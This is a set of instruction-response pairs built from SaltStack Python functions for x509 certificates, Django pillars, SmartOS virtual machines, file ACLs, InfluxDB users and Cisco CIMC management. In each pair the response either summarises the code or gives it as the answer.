{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef create_csr(path=None, text=False, **kwargs):\n    '''\n    Create a certificate signing request.\n\n    path:\n        Path to write the certificate to.\n\n    text:\n        If ``True``, return the PEM text without writing to a file.\n        Default ``False``.\n\n    algorithm:\n        The hashing algorithm to be used for signing this request. Defaults to sha256.\n\n    kwargs:\n        The subject, extension and version arguments from\n        :mod:`x509.create_certificate <salt.modules.x509.create_certificate>`\n        can be used.\n\n    ext_mapping:\n        Provide additional X509v3 extension mappings.  This argument should be\n        in the form of a dictionary and should include both the OID and the\n        friendly name for the extension.\n\n        .. versionadded:: Neon\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' x509.create_csr path=/etc/pki/myca.csr public_key='/etc/pki/myca.key' CN='My Cert'\n    '''\n\n    if not path and not text:\n        raise salt.exceptions.SaltInvocationError(\n            'Either path or text must be specified.')\n    if path and text:\n        raise salt.exceptions.SaltInvocationError(\n            'Either path or text must be specified, not both.')\n\n    csr = M2Crypto.X509.Request()\n    subject = csr.get_subject()\n\n    for prop, default in six.iteritems(CERT_DEFAULTS):\n        if prop not in kwargs:\n            kwargs[prop] = default\n\n    csr.set_version(kwargs['version'] - 1)\n\n    if 'private_key' not in kwargs and 'public_key' in kwargs:\n        kwargs['private_key'] = kwargs['public_key']\n        log.warning(\"OpenSSL no longer allows working with non-signed CSRs. \"\n                    \"A private_key must be specified. Attempting to use public_key as private_key\")\n\n    if 'private_key' not in kwargs:\n        raise salt.exceptions.SaltInvocationError('private_key is required')\n\n    if 'public_key' not in kwargs:\n        kwargs['public_key'] = kwargs['private_key']\n\n    if 'private_key_passphrase' not in kwargs:\n        kwargs['private_key_passphrase'] = None\n    if 'public_key_passphrase' not in kwargs:\n        kwargs['public_key_passphrase'] = None\n    if kwargs['public_key_passphrase'] and not kwargs['private_key_passphrase']:\n        kwargs['private_key_passphrase'] = kwargs['public_key_passphrase']\n    if kwargs['private_key_passphrase'] and not kwargs['public_key_passphrase']:\n        kwargs['public_key_passphrase'] = kwargs['private_key_passphrase']\n\n    csr.set_pubkey(get_public_key(kwargs['public_key'],\n                                  passphrase=kwargs['public_key_passphrase'], asObj=True))\n\n    # pylint: disable=unused-variable\n    for entry, num in six.iteritems(subject.nid):\n        if entry in kwargs:\n            setattr(subject, entry, kwargs[entry])\n    # pylint: enable=unused-variable\n\n    if 'ext_mapping' in kwargs:\n        EXT_NAME_MAPPINGS.update(kwargs['ext_mapping'])\n\n    extstack = M2Crypto.X509.X509_Extension_Stack()\n    for extname, extlongname in six.iteritems(EXT_NAME_MAPPINGS):\n        if extname not in kwargs and extlongname not in kwargs:\n            continue\n\n        extval = kwargs.get(extname, None) or kwargs.get(extlongname, None)\n\n        critical = False\n        if extval.startswith('critical '):\n            critical = True\n            extval = extval[9:]\n\n        if extname == 'subjectKeyIdentifier' and 'hash' in extval:\n            extval = extval.replace('hash', _get_pubkey_hash(csr))\n\n        if extname == 'subjectAltName':\n            extval = extval.replace('IP Address', 'IP')\n\n        if extname == 'authorityKeyIdentifier':\n            continue\n\n        issuer = None\n        ext = _new_extension(\n            name=extname, value=extval, critical=critical, issuer=issuer)\n        if not ext.x509_ext:\n            log.info('Invalid X509v3 Extension. %s: %s', extname, extval)\n            continue\n\n        extstack.push(ext)\n\n    csr.add_extensions(extstack)\n    csr.sign(_get_private_key_obj(kwargs['private_key'],\n                                  passphrase=kwargs['private_key_passphrase']), kwargs['algorithm'])\n\n    return write_pem(text=csr.as_pem(), path=path, pem_type='CERTIFICATE REQUEST') if path else csr.as_pem()", "response": "Create a certificate signing request."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef verify_signature(certificate, signing_pub_key=None,\n                     signing_pub_key_passphrase=None):\n    '''\n    Verify that ``certificate`` has been signed by ``signing_pub_key``\n\n    certificate:\n        The certificate to verify. Can be a path or string containing a\n        PEM formatted certificate.\n\n    signing_pub_key:\n        The public key to verify, can be a string or path to a PEM formatted\n        certificate, csr, or private key.\n\n    signing_pub_key_passphrase:\n        Passphrase to the signing_pub_key if it is an encrypted private key.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' x509.verify_signature /etc/pki/mycert.pem \\\\\n                signing_pub_key=/etc/pki/myca.crt\n    '''\n    cert = _get_certificate_obj(certificate)\n\n    if signing_pub_key:\n        signing_pub_key = get_public_key(signing_pub_key,\n                                         passphrase=signing_pub_key_passphrase, asObj=True)\n\n    return bool(cert.verify(pkey=signing_pub_key) == 1)", "response": "Verify that a certificate has been signed by a specific public key."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nvalidate a CRL against a certificate.", "response": "def verify_crl(crl, cert):\n    '''\n    Validate a CRL against a certificate.\n    Parses openssl command line output, this is a workaround for M2Crypto's\n    inability to get them from CSR objects.\n\n    crl:\n        The CRL to verify\n\n    cert:\n        The certificate to verify the CRL against\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' x509.verify_crl crl=/etc/pki/myca.crl cert=/etc/pki/myca.crt\n    '''\n    if not salt.utils.path.which('openssl'):\n        raise salt.exceptions.SaltInvocationError('External command \"openssl\" not found')\n\n    crltext = _text_or_file(crl)\n    crltext = get_pem_entry(crltext, pem_type='X509 CRL')\n    crltempfile = tempfile.NamedTemporaryFile()\n    crltempfile.write(salt.utils.stringutils.to_str(crltext))\n    crltempfile.flush()\n\n    certtext = _text_or_file(cert)\n    certtext = get_pem_entry(certtext, pem_type='CERTIFICATE')\n    certtempfile = tempfile.NamedTemporaryFile()\n    certtempfile.write(salt.utils.stringutils.to_str(certtext))\n    certtempfile.flush()\n\n    cmd = ('openssl crl -noout -in {0} -CAfile {1}'.format(\n        crltempfile.name, certtempfile.name))\n\n    output = __salt__['cmd.run_stderr'](cmd)\n\n    crltempfile.close()\n    certtempfile.close()\n\n    return 'verify OK' in output"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns a dict containing limited details of a certificate and whether the certificate has expired.", "response": "def expired(certificate):\n    '''\n    Returns a dict containing limited details of a\n    certificate and whether the certificate has expired.\n\n    .. versionadded:: 2016.11.0\n\n    certificate:\n        The certificate to be read. Can be a path to a certificate file,\n        or a string containing the PEM formatted text of the certificate.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' x509.expired \"/etc/pki/mycert.crt\"\n    '''\n    ret = {}\n\n    if os.path.isfile(certificate):\n        try:\n            ret['path'] = certificate\n            cert = _get_certificate_obj(certificate)\n\n            _now = datetime.datetime.utcnow()\n            _expiration_date = cert.get_not_after().get_datetime()\n\n            ret['cn'] = _parse_subject(cert.get_subject())['CN']\n\n            if _expiration_date.strftime(\"%Y-%m-%d %H:%M:%S\") <= \\\n                    _now.strftime(\"%Y-%m-%d %H:%M:%S\"):\n                ret['expired'] = True\n            else:\n                ret['expired'] = False\n        except ValueError as err:\n            log.debug('Failed to get data of expired certificate: %s', err)\n            log.trace(err, exc_info=True)\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef will_expire(certificate, days):\n    '''\n    Returns a dict containing details of a certificate and whether\n    the certificate will expire in the specified number of days.\n    Input can be a PEM string or file path.\n\n    .. versionadded:: 2016.11.0\n\n    certificate:\n        The certificate to be read. Can be a path to a certificate file,\n        or a string containing the PEM formatted text of the certificate.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' x509.will_expire \"/etc/pki/mycert.crt\" days=30\n    '''\n    ts_pt = \"%Y-%m-%d %H:%M:%S\"\n    ret = {}\n\n    if os.path.isfile(certificate):\n        try:\n            ret['path'] = certificate\n            ret['check_days'] = days\n\n            cert = _get_certificate_obj(certificate)\n\n            _check_time = datetime.datetime.utcnow() + datetime.timedelta(days=days)\n            _expiration_date = cert.get_not_after().get_datetime()\n\n            ret['cn'] = _parse_subject(cert.get_subject())['CN']\n            ret['will_expire'] = _expiration_date.strftime(ts_pt) <= _check_time.strftime(ts_pt)\n        except ValueError as err:\n            log.debug('Unable to return details of a sertificate expiration: %s', err)\n            log.trace(err, exc_info=True)\n\n    return ret", "response": "Returns a dict containing details of a certificate and whether it will expire in the specified number of days."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nconnect to a Django database through the ORM and retrieve model fields :type pillar_name: str :param pillar_name: The name of the pillar to be returned :type project_path: str :param project_path: The full path to your Django project (the directory manage.py is in) :type settings_module: str :param settings_module: The settings module for your project. This can be found in your manage.py file :type django_app: str :param django_app: A dictionary containing your apps, models, and fields :type env: str :param env: The full path to the virtualenv for your Django project :type env_file: str :param env_file: An optional bash file that sets up your environment. The file is run in a subprocess and the changed variables are then added", "response": "def ext_pillar(minion_id,  # pylint: disable=W0613\n               pillar,  # pylint: disable=W0613\n               pillar_name,\n               project_path,\n               settings_module,\n               django_app,\n               env=None,\n               env_file=None,\n               *args,  # pylint: disable=W0613\n               **kwargs):  # pylint: disable=W0613\n    '''\n    Connect to a Django database through the ORM and retrieve model fields\n\n    :type pillar_name: str\n    :param pillar_name: The name of the pillar to be returned\n\n    :type project_path: str\n    :param project_path: The full path to your Django project (the directory\n        manage.py is in)\n\n    :type settings_module: str\n    :param settings_module: The settings module for your project. This can be\n        found in your manage.py file\n\n    :type django_app: str\n    :param django_app: A dictionary containing your apps, models, and fields\n\n    :type env: str\n    :param env: The full path to the virtualenv for your Django project\n\n    :type env_file: str\n    :param env_file: An optional bash file that sets up your environment. The\n        file is run in a subprocess and the changed variables are then added\n    '''\n\n    if not os.path.isdir(project_path):\n        log.error('Django project dir: \\'%s\\' not a directory!', project_path)\n        return {}\n    if HAS_VIRTUALENV and env is not None and os.path.isdir(env):\n        for path in virtualenv.path_locations(env):\n            if not os.path.isdir(path):\n                log.error('Virtualenv %s not a directory!', path)\n                return {}\n        # load the virtualenv first\n        sys.path.insert(0,\n                        os.path.join(\n                            virtualenv.path_locations(env)[1],\n                            'site-packages'))\n\n    # load the django project\n    sys.path.append(project_path)\n\n    os.environ['DJANGO_SETTINGS_MODULE'] = settings_module\n\n    if env_file is not None:\n        import subprocess\n\n        base_env = {}\n        proc = subprocess.Popen(['bash', '-c', 'env'], stdout=subprocess.PIPE)\n        for line in proc.stdout:\n            (key, _, value) = salt.utils.stringutils.to_str(line).partition('=')\n            base_env[key] = value\n\n        command = ['bash', '-c', 'source {0} && env'.format(env_file)]\n        proc = subprocess.Popen(command, stdout=subprocess.PIPE)\n\n        for line in proc.stdout:\n            (key, _, value) = salt.utils.stringutils.to_str(line).partition('=')\n            # only add a key if it is different or doesn't already exist\n            if key not in base_env or base_env[key] != value:\n                os.environ[key] = value.rstrip('\\n')\n                log.debug('Adding %s = %s to Django environment', key, value.rstrip('\\n'))\n\n    try:\n        from django.db.models.loading import get_model\n\n        django_pillar = {}\n\n        for proj_app, models in six.iteritems(django_app):\n            _, _, app = proj_app.rpartition('.')\n            django_pillar[app] = {}\n            for model_name, model_meta in six.iteritems(models):\n                model_orm = get_model(app, model_name)\n                if model_orm is None:\n                    raise salt.exceptions.SaltException(\n                        \"Django model '{0}' not found in app '{1}'.\"\n                        .format(app, model_name))\n\n                pillar_for_model = django_pillar[app][model_orm.__name__] = {}\n\n                name_field = model_meta['name']\n                fields = model_meta['fields']\n\n                if 'filter' in model_meta:\n                    qs = (model_orm.objects\n                        .filter(**model_meta['filter'])\n                        .values(*fields))\n                else:\n                    qs = model_orm.objects.values(*fields)\n\n                for model in qs:\n                    # Check that the human-friendly name given is valid (will\n                    # be able to pick up a value from the query) and unique\n                    # (since we're using it as the key in a dictionary)\n                    if name_field not in model:\n                        raise salt.exceptions.SaltException(\n                            \"Name '{0}' not found in returned fields.\".format(\n                                name_field))\n\n                    if model[name_field] in pillar_for_model:\n                        raise salt.exceptions.SaltException(\n                            \"Value for '{0}' is not unique: {0}\".format(\n                                model[name_field]))\n\n                    pillar_for_model[model[name_field]] = model\n\n        return {pillar_name: django_pillar}\n    except ImportError as e:\n        log.error('Failed to import library: %s', e)\n        return {}\n    except Exception as e:\n        log.error('Failed on Error: %s', e)\n        log.debug('django_orm traceback', exc_info=True)\n        return {}"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn a list of virtual machine names on the minion", "response": "def list_domains():\n    '''\n    Return a list of virtual machine names on the minion\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' virt.list_domains\n    '''\n    data = __salt__['vmadm.list'](keyed=True)\n    vms = [\"UUID                                  TYPE  RAM      STATE             ALIAS\"]\n    for vm in data:\n        vms.append(\"{vmuuid}{vmtype}{vmram}{vmstate}{vmalias}\".format(\n            vmuuid=vm.ljust(38),\n            vmtype=data[vm]['type'].ljust(6),\n            vmram=data[vm]['ram'].ljust(9),\n            vmstate=data[vm]['state'].ljust(18),\n            vmalias=data[vm]['alias'],\n        ))\n    return vms"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef vm_virt_type(domain):\n    '''\n    Return VM virtualization type : OS or KVM\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' virt.vm_virt_type <domain>\n    '''\n    ret = __salt__['vmadm.lookup'](search=\"uuid={uuid}\".format(uuid=domain), order='type')\n    if not ret:\n        raise CommandExecutionError(\"We can't determine the type of this VM\")\n\n    return ret[0]['type']", "response": "Return the virtualization type of this VM"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nchange the amount of memory allocated to VM.", "response": "def setmem(domain, memory):\n    '''\n    Change the amount of memory allocated to VM.\n    <memory> is to be specified in MB.\n\n    Note for KVM : this would require a restart of the VM.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' virt.setmem <domain> 512\n    '''\n    vmtype = vm_virt_type(domain)\n    if vmtype == 'OS':\n        return __salt__['vmadm.update'](vm=domain, max_physical_memory=memory)\n    elif vmtype == 'LX':\n        return __salt__['vmadm.update'](vm=domain, max_physical_memory=memory)\n    elif vmtype == 'KVM':\n        log.warning('Changes will be applied after the VM restart.')\n        return __salt__['vmadm.update'](vm=domain, ram=memory)\n    else:\n        raise CommandExecutionError('Unknown VM type')\n\n    return False"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn a list off MAC addresses from the named VM CLI Example : bash salt '*' virt. get_macs <domain >", "response": "def get_macs(domain):\n    '''\n    Return a list off MAC addresses from the named VM\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' virt.get_macs <domain>\n    '''\n    macs = []\n    ret = __salt__['vmadm.lookup'](search=\"uuid={uuid}\".format(uuid=domain), order='nics')\n    if not ret:\n        raise CommandExecutionError('We can\\'t find the MAC address of this VM')\n    else:\n        for nic in ret[0]['nics']:\n            macs.append(nic['mac'])\n        return macs"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn a map of FACLs on specified file", "response": "def getfacl(*args, **kwargs):\n    '''\n    Return (extremely verbose) map of FACLs on specified file(s)\n\n    CLI Examples:\n\n    .. code-block:: bash\n\n        salt '*' acl.getfacl /tmp/house/kitchen\n        salt '*' acl.getfacl /tmp/house/kitchen /tmp/house/livingroom\n        salt '*' acl.getfacl /tmp/house/kitchen /tmp/house/livingroom recursive=True\n    '''\n    recursive = kwargs.pop('recursive', False)\n\n    _raise_on_no_files(*args)\n\n    ret = {}\n    cmd = 'getfacl --absolute-names'\n    if recursive:\n        cmd += ' -R'\n    for dentry in args:\n        cmd += ' \"{0}\"'.format(dentry)\n    out = __salt__['cmd.run'](cmd, python_shell=False).splitlines()\n    dentry = ''\n    for line in out:\n        if not line:\n            continue\n        elif line.startswith('getfacl'):\n            continue\n        elif line.startswith('#'):\n            comps = line.replace('# ', '').split(': ')\n            if comps[0] == 'file':\n                dentry = comps[1]\n                ret[dentry] = {'comment': {},\n                               'user': [],\n                               'group': []}\n            ret[dentry]['comment'][comps[0]] = comps[1]\n            if comps[0] == 'flags':\n                flags = list(comps[1])\n                if flags[0] == 's':\n                    ret[dentry]['suid'] = True\n                if flags[1] == 's':\n                    ret[dentry]['sgid'] = True\n                if flags[2] == 't':\n                    ret[dentry]['sticky'] = True\n        else:\n            vals = _parse_acl(acl=line,\n                              user=ret[dentry]['comment']['owner'],\n                              group=ret[dentry]['comment']['group'])\n            acl_type = vals['type']\n            del vals['type']\n            for entity in ('user', 'group'):\n                if entity in vals:\n                    usergroup = vals[entity]\n                    del vals[entity]\n                    if acl_type == 'acl':\n                        ret[dentry][entity].append({usergroup: vals})\n                    elif acl_type == 'default':\n                        if 'defaults' not in ret[dentry]:\n                            ret[dentry]['defaults'] = {}\n                        if entity not in ret[dentry]['defaults']:\n                            ret[dentry]['defaults'][entity] = []\n                        ret[dentry]['defaults'][entity].append({usergroup: vals})\n            for entity in ('other', 'mask'):\n                if entity in vals:\n                    del vals[entity]\n                    if acl_type == 'acl':\n                        ret[dentry][entity] = [{\"\": vals}]\n                    elif acl_type == 'default':\n                        if 'defaults' not in ret[dentry]:\n                            ret[dentry]['defaults'] = {}\n                        ret[dentry]['defaults'][entity] = [{\"\": vals}]\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _parse_acl(acl, user, group):\n    '''\n    Parse a single ACL rule\n    '''\n    comps = acl.split(':')\n    vals = {}\n\n    # What type of rule is this?\n    vals['type'] = 'acl'\n    if comps[0] == 'default':\n        vals['type'] = 'default'\n        comps.pop(0)\n\n    # If a user is not specified, use the owner of the file\n    if comps[0] == 'user' and not comps[1]:\n        comps[1] = user\n    elif comps[0] == 'group' and not comps[1]:\n        comps[1] = group\n    vals[comps[0]] = comps[1]\n\n    # Set the permissions fields\n    octal = 0\n    vals['permissions'] = {}\n    if 'r' in comps[-1]:\n        octal += 4\n        vals['permissions']['read'] = True\n    else:\n        vals['permissions']['read'] = False\n    if 'w' in comps[-1]:\n        octal += 2\n        vals['permissions']['write'] = True\n    else:\n        vals['permissions']['write'] = False\n    if 'x' in comps[-1]:\n        octal += 1\n        vals['permissions']['execute'] = True\n    else:\n        vals['permissions']['execute'] = False\n    vals['octal'] = octal\n\n    return vals", "response": "Parse a single ACL rule into a dictionary."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nremoves all FACLs from the specified file", "response": "def wipefacls(*args, **kwargs):\n    '''\n    Remove all FACLs from the specified file(s)\n\n    CLI Examples:\n\n    .. code-block:: bash\n\n        salt '*' acl.wipefacls /tmp/house/kitchen\n        salt '*' acl.wipefacls /tmp/house/kitchen /tmp/house/livingroom\n        salt '*' acl.wipefacls /tmp/house/kitchen /tmp/house/livingroom recursive=True\n    '''\n    recursive = kwargs.pop('recursive', False)\n\n    _raise_on_no_files(*args)\n    cmd = 'setfacl -b'\n    if recursive:\n        cmd += ' -R'\n    for dentry in args:\n        cmd += ' \"{0}\"'.format(dentry)\n    __salt__['cmd.run'](cmd, python_shell=False)\n    return True"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef modfacl(acl_type, acl_name='', perms='', *args, **kwargs):\n    '''\n    Add or modify a FACL for the specified file(s)\n\n    CLI Examples:\n\n    .. code-block:: bash\n\n        salt '*' acl.modfacl user myuser rwx /tmp/house/kitchen\n        salt '*' acl.modfacl default:group mygroup rx /tmp/house/kitchen\n        salt '*' acl.modfacl d:u myuser 7 /tmp/house/kitchen\n        salt '*' acl.modfacl g mygroup 0 /tmp/house/kitchen /tmp/house/livingroom\n        salt '*' acl.modfacl user myuser rwx /tmp/house/kitchen recursive=True\n        salt '*' acl.modfacl user myuser rwx /tmp/house/kitchen raise_err=True\n    '''\n    recursive = kwargs.pop('recursive', False)\n    raise_err = kwargs.pop('raise_err', False)\n\n    _raise_on_no_files(*args)\n\n    cmd = 'setfacl'\n    if recursive:\n        cmd += ' -R'  # -R must come first as -m needs the acl_* arguments that come later\n\n    cmd += ' -m'\n\n    cmd = '{0} {1}:{2}:{3}'.format(cmd, _acl_prefix(acl_type), acl_name, perms)\n\n    for dentry in args:\n        cmd += ' \"{0}\"'.format(dentry)\n    __salt__['cmd.run'](cmd, python_shell=False, raise_err=raise_err)\n    return True", "response": "Add or modify a FACL for the specified file"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nremove specific FACL from the specified file", "response": "def delfacl(acl_type, acl_name='', *args, **kwargs):\n    '''\n    Remove specific FACL from the specified file(s)\n\n    CLI Examples:\n\n    .. code-block:: bash\n\n        salt '*' acl.delfacl user myuser /tmp/house/kitchen\n        salt '*' acl.delfacl default:group mygroup /tmp/house/kitchen\n        salt '*' acl.delfacl d:u myuser /tmp/house/kitchen\n        salt '*' acl.delfacl g myuser /tmp/house/kitchen /tmp/house/livingroom\n        salt '*' acl.delfacl user myuser /tmp/house/kitchen recursive=True\n    '''\n    recursive = kwargs.pop('recursive', False)\n\n    _raise_on_no_files(*args)\n\n    cmd = 'setfacl'\n    if recursive:\n        cmd += ' -R'\n\n    cmd += ' -x'\n\n    cmd = '{0} {1}:{2}'.format(cmd, _acl_prefix(acl_type), acl_name)\n\n    for dentry in args:\n        cmd += ' \"{0}\"'.format(dentry)\n    __salt__['cmd.run'](cmd, python_shell=False)\n    return True"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nensure that given user is present in the user database.", "response": "def present(name,\n            passwd,\n            admin=False,\n            grants=None,\n            **client_args):\n    '''\n    Ensure that given user is present.\n\n    name\n        Name of the user to manage\n\n    passwd\n        Password of the user\n\n    admin : False\n        Whether the user should have cluster administration\n        privileges or not.\n\n    grants\n        Optional - Dict of database:privilege items associated with\n        the user. Example:\n\n        grants:\n          foo_db: read\n          bar_db: all\n\n    **Example:**\n\n    .. code-block:: yaml\n\n        example user present in influxdb:\n          influxdb_user.present:\n            - name: example\n            - passwd: somepassword\n            - admin: False\n            - grants:\n                foo_db: read\n                bar_db: all\n    '''\n    create = False\n    ret = {'name': name,\n           'changes': {},\n           'result': True,\n           'comment': 'User {0} is present and up to date'.format(name)}\n\n    if not __salt__['influxdb.user_exists'](name, **client_args):\n        create = True\n        if __opts__['test']:\n            ret['comment'] = 'User {0} will be created'.format(name)\n            ret['result'] = None\n            return ret\n        else:\n            if not __salt__['influxdb.create_user'](\n                    name, passwd, admin=admin, **client_args):\n                ret['comment'] = 'Failed to create user {0}'.format(name)\n                ret['result'] = False\n                return ret\n    else:\n        user = __salt__['influxdb.user_info'](name, **client_args)\n\n        if user['admin'] != admin:\n            if not __opts__['test']:\n                if admin:\n                    __salt__['influxdb.grant_admin_privileges'](\n                        name, **client_args)\n                else:\n                    __salt__['influxdb.revoke_admin_privileges'](\n                        name, **client_args)\n\n                if admin != __salt__['influxdb.user_info'](\n                        name, **client_args)['admin']:\n                    ret['comment'] = 'Failed to set admin privilege to ' \\\n                            'user {0}'.format(name)\n                    ret['result'] = False\n                    return ret\n            ret['changes']['Admin privileges'] = admin\n\n    if grants:\n        db_privileges = __salt__['influxdb.list_privileges'](\n            name, **client_args)\n        for database, privilege in grants.items():\n            privilege = privilege.lower()\n            if privilege != db_privileges.get(database, privilege):\n                if not __opts__['test']:\n                    __salt__['influxdb.revoke_privilege'](\n                        database, 'all', name, **client_args)\n                del db_privileges[database]\n            if database not in db_privileges:\n                ret['changes']['Grant on database {0} to user {1}'.format(\n                    database, name)] = privilege\n                if not __opts__['test']:\n                    __salt__['influxdb.grant_privilege'](\n                        database, privilege, name, **client_args)\n\n    if ret['changes']:\n        if create:\n            ret['comment'] = 'Created user {0}'.format(name)\n            ret['changes'][name] = 'User created'\n        else:\n            if __opts__['test']:\n                ret['result'] = None\n                ret['comment'] = 'User {0} will be updated with the ' \\\n                        'following changes:'.format(name)\n                for k, v in ret['changes'].items():\n                    ret['comment'] += '\\n{0} => {1}'.format(k, v)\n                ret['changes'] = {}\n            else:\n                ret['comment'] = 'Updated user {0}'.format(name)\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nactivating the firmware backup image.", "response": "def activate_backup_image(reset=False):\n    '''\n    Activates the firmware backup image.\n\n    CLI Example:\n\n    Args:\n        reset(bool): Reset the CIMC device on activate.\n\n    .. code-block:: bash\n\n        salt '*' cimc.activate_backup_image\n        salt '*' cimc.activate_backup_image reset=True\n\n    '''\n\n    dn = \"sys/rack-unit-1/mgmt/fw-boot-def/bootunit-combined\"\n\n    r = \"no\"\n\n    if reset is True:\n        r = \"yes\"\n\n    inconfig = \"\"\"<firmwareBootUnit dn='sys/rack-unit-1/mgmt/fw-boot-def/bootunit-combined'\n    adminState='trigger' image='backup' resetOnActivate='{0}' />\"\"\".format(r)\n\n    ret = __proxy__['cimc.set_config_modify'](dn, inconfig, False)\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncreating a user in the system.", "response": "def create_user(uid=None, username=None, password=None, priv=None):\n    '''\n    Create a CIMC user with username and password.\n\n    Args:\n        uid(int): The user ID slot to create the user account in.\n\n        username(str): The name of the user.\n\n        password(str): The clear text password of the user.\n\n        priv(str): The privilege level of the user.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' cimc.create_user 11 username=admin password=foobar priv=admin\n\n    '''\n\n    if not uid:\n        raise salt.exceptions.CommandExecutionError(\"The user ID must be specified.\")\n\n    if not username:\n        raise salt.exceptions.CommandExecutionError(\"The username must be specified.\")\n\n    if not password:\n        raise salt.exceptions.CommandExecutionError(\"The password must be specified.\")\n\n    if not priv:\n        raise salt.exceptions.CommandExecutionError(\"The privilege level must be specified.\")\n\n    dn = \"sys/user-ext/user-{0}\".format(uid)\n\n    inconfig = \"\"\"<aaaUser id=\"{0}\" accountStatus=\"active\" name=\"{1}\" priv=\"{2}\"\n    pwd=\"{3}\"  dn=\"sys/user-ext/user-{0}\"/>\"\"\".format(uid,\n                                                      username,\n                                                      priv,\n                                                      password)\n\n    ret = __proxy__['cimc.set_config_modify'](dn, inconfig, False)\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nmount a remote file through a remote share.", "response": "def mount_share(name=None,\n                remote_share=None,\n                remote_file=None,\n                mount_type=\"nfs\",\n                username=None,\n                password=None):\n    '''\n    Mounts a remote file through a remote share. Currently, this feature is supported in version 1.5 or greater.\n    The remote share can be either NFS, CIFS, or WWW.\n\n    Some of the advantages of CIMC Mounted vMedia include:\n      Communication between mounted media and target stays local (inside datacenter)\n      Media mounts can be scripted/automated\n      No vKVM requirements for media connection\n      Multiple share types supported\n      Connections supported through all CIMC interfaces\n\n      Note: CIMC Mounted vMedia is enabled through BIOS configuration.\n\n    Args:\n        name(str): The name of the volume on the CIMC device.\n\n        remote_share(str): The file share link that will be used to mount the share. This can be NFS, CIFS, or WWW. This\n        must be the directory path and not the full path to the remote file.\n\n        remote_file(str): The name of the remote file to mount. It must reside within remote_share.\n\n        mount_type(str): The type of share to mount. Valid options are nfs, cifs, and www.\n\n        username(str): An optional requirement to pass credentials to the remote share. If not provided, an\n        unauthenticated connection attempt will be made.\n\n        password(str): An optional requirement to pass a password to the remote share. If not provided, an\n        unauthenticated connection attempt will be made.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' cimc.mount_share name=WIN7 remote_share=10.xxx.27.xxx:/nfs remote_file=sl1huu.iso\n\n        salt '*' cimc.mount_share name=WIN7 remote_share=10.xxx.27.xxx:/nfs remote_file=sl1huu.iso username=bob password=badpassword\n\n    '''\n\n    if not name:\n        raise salt.exceptions.CommandExecutionError(\"The share name must be specified.\")\n\n    if not remote_share:\n        raise salt.exceptions.CommandExecutionError(\"The remote share path must be specified.\")\n\n    if not remote_file:\n        raise salt.exceptions.CommandExecutionError(\"The remote file name must be specified.\")\n\n    if username and password:\n        mount_options = \" mountOptions='username={0},password={1}'\".format(username, password)\n    else:\n        mount_options = \"\"\n\n    dn = 'sys/svc-ext/vmedia-svc/vmmap-{0}'.format(name)\n    inconfig = \"\"\"<commVMediaMap dn='sys/svc-ext/vmedia-svc/vmmap-{0}' map='{1}'{2}\n    remoteFile='{3}' remoteShare='{4}' status='created'\n    volumeName='Win12' />\"\"\".format(name, mount_type, mount_options, remote_file, remote_share)\n\n    ret = __proxy__['cimc.set_config_modify'](dn, inconfig, False)\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef set_hostname(hostname=None):\n    '''\n    Sets the hostname on the server.\n\n    .. versionadded:: 2019.2.0\n\n    Args:\n        hostname(str): The new hostname to set.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' cimc.set_hostname foobar\n\n    '''\n    if not hostname:\n        raise salt.exceptions.CommandExecutionError(\"Hostname option must be provided.\")\n\n    dn = \"sys/rack-unit-1/mgmt/if-1\"\n    inconfig = \"\"\"<mgmtIf dn=\"sys/rack-unit-1/mgmt/if-1\" hostname=\"{0}\" ></mgmtIf>\"\"\".format(hostname)\n\n    ret = __proxy__['cimc.set_config_modify'](dn, inconfig, False)\n\n    try:\n        if ret['outConfig']['mgmtIf'][0]['status'] == 'modified':\n            return True\n        else:\n            return False\n    except Exception as err:\n        return False", "response": "Sets the hostname on the server."}
